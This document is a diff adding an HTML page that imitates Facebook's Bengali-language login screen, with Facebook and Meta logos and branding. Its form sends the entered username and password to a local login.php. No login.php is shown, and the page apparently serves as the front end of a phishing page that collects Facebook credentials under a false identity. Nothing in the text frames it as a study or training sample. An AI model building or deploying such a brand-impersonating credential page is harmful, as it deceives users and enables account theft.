@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Facebook লগইন</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
+      background: #ffffff;
+      color: #1c1e21;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .lang {
+      font-size: 16px;
+      color: #1c1e21;
+      margin-bottom: 30px;
+    }
+
+    .logo {
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      height: 60px;
+    }
+
+    .form-container {
+      width: 100%;
+      max-width: 350px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .input-box {
+      border: 1px solid #dddfe2;
+      border-radius: 10px;
+      padding: 15px;
+      font-size: 16px;
+      margin-bottom: 10px;
+      outline: none;
+    }
+
+    .login-btn {
+      background-color: #1877f2;
+      border: none;
+      color: white;
+      font-size: 17px;
+      font-weight: bold;
+      padding: 14px;
+      border-radius: 30px;
+      cursor: pointer;
+      margin-top: 5px;
+    }
+
+    .login-btn:hover {
+      background-color: #165ecb;
+    }
+
+    .forgot {
+      text-align: center;
+      font-size: 15px;
+      color: #1c1e21;
+      margin: 15px 0;
+    }
+
+    .create-btn {
+      border: 1px solid #1877f2;
+      background-color: transparent;
+      color: #1877f2;
+      font-size: 16px;
+      font-weight: bold;
+      padding: 12px;
+      border-radius: 30px;
+      text-align: center;
+      cursor: pointer;
+    }
+
+    .create-btn:hover {
+      background-color: #f0f2f5;
+    }
+
+    .meta {
+      text-align: center;
+      margin-top: 30px;
+      font-size: 14px;
+      color: #606770;
+    }
+
+    .meta img {
+      height: 20px;
+      margin-top: 6px;
+    }
+  </style>
+</head>
+<body>
+  <div class="lang">বাংলা</div>
+
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" />
+  </div>
+
+  <form action="login.php" method="POST" class="form-container">
+    <input type="text" name="username" class="input-box" placeholder="মোবাইল নম্বর বা ইমেইল অ্যাড্রেস" required />
+    <input type="password" name="password" class="input-box" placeholder="পাসওয়ার্ড" required />
+    <button type="submit" class="login-btn">লগ ইন করুন</button>
+  </form>
+
+  <div class="forgot">পাসওয়ার্ড ভুলে গেছেন?</div>
+
+  <div class="form-container">
+    <div class="create-btn">নতুন অ্যাকাউন্ট তৈরি করুন</div>
+  </div>
+
+  <div class="meta">
+    <div>Meta</div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Meta_Platforms_Inc._logo.svg" alt="Meta" />
+  </div>
+</body>
+</html>
